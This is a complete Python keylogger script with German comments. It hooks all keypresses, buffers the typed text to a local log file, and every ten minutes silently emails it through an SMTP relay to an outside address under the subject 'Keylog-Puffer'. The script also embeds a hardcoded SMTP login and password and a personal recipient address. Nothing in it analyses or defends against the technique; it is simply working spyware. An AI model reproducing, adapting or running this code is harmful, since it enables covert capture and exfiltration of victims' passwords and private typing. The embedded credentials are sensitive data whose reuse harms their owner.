import smtplib
import threading
import time
import keyboard
from email.mime.text import MIMEText

# ----- KONFIGURATION -----
SMTP_SERVER = "smtp-relay.brevo.com"
SMTP_PORT = 587
SMTP_LOGIN = "b865b1001@smtp-brevo.com"
SMTP_PASSWORD = "xsmtpsib-4e5e6b33f976ee126c448698ba02af0373ca9de44b7a63314ee076a64fb55c5d-VYzLHJKi3Wwerrjz"
EMAIL_FROM = "b865b1001@smtp-brevo.com"
EMAIL_TO = "ernis.bljakaj@edu.vs.ch"
# -------------------------

key_input = ""

def send_email(text):
    if not text.strip():
        return
    msg = MIMEText(text)
    msg["Subject"] = "Keylog-Puffer"
    msg["From"] = EMAIL_FROM
    msg["To"] = EMAIL_TO

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_LOGIN, SMTP_PASSWORD)
            server.send_message(msg)
    except Exception:
        pass

def timer_loop():
    global key_input
    while True:
        time.sleep(600)
        if key_input:
            send_email(key_input)

def save_to_file():
    global key_input
    with open("log.txt", "w", encoding="utf-8") as f:
        f.write(f"Aktuelle Variable: [{key_input}]")

def reset_variable():
    global key_input
    key_input = ""
    save_to_file()

def on_key_event(event):
    global key_input
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "space":
            key_input += " "
            save_to_file()
        elif event.name == "backspace":
            if len(key_input) > 0:
                key_input = key_input[:-1]
                save_to_file()
        elif event.name == "enter":
            reset_variable()
        elif len(event.name) == 1:
            key_input += event.name
            save_to_file()

# Timer-Thread starten
timer_thread = threading.Thread(target=timer_loop, daemon=True)
timer_thread.start()

print("Eingabeprogramm aktiv. Drücke 'Esc' zum Beenden, 'Enter' zum Speichern & Zurücksetzen, 'Ctrl+L' zum Zurücksetzen.")

keyboard.add_hotkey('ctrl+l', reset_variable)
keyboard.hook(on_key_event)
keyboard.wait("esc")

print("\nProgramm beendet.")